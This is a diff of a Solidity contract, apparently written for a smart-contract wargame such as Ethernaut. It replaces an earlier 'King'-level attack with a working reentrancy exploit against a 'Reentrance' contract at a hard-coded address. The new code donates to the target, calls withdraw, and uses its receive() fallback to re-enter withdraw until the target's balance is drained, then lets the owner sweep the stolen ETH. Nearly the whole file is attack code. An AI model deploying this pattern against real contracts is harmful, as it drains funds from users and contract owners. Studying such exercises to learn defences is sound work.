@@ -2,21 +2,39 @@
 
 pragma solidity ^0.8.7;
 
-interface CoinFlip {}
+import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract Counter {
-    address payable private constant coinFlipAddress =
-        payable(0xF01e03f9B622E7a628CAa85495025B1430Ad1Ac6);
-    CoinFlip constant coinFlipContract = CoinFlip(coinFlipAddress);
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
 
+contract Counter is Ownable {
+    IReentrance targetContract =
+        IReentrance(0x0ff55aA8E7732883128DD17B337aB756B936A0F3);
+    uint targetValue = 0.001 ether;
 
-    constructor() payable {
-
+    function balance() public view returns (uint) {
+        return address(this).balance;
     }
 
-    function pwn() public {
-      // send 0.0011 eth to KING. you are now the owner and King cannot be reset
-      (bool sent, bytes memory data) = coinFlipAddress.call{value: 0.0011 ether}("");
-      require(sent, "failed to transfer eth");
+    function pwn() public payable {
+        require(msg.value >= targetValue, "not enough ETH");
+        targetContract.donate{value: msg.value}(address(this));
+        targetContract.withdraw(msg.value);
+    }
+
+    function withdrawAll() public onlyOwner returns (bool) {
+        uint totalBalance = address(this).balance;
+        (bool sent, ) = msg.sender.call{value: totalBalance}("");
+        require(sent, "Failed to send Ether");
+        return sent;
+    }
+
+    receive() external payable {
+        uint targetBalance = address(targetContract).balance;
+        if (targetBalance >= targetValue) {
+            targetContract.withdraw(targetValue);
+        }
     }
 }
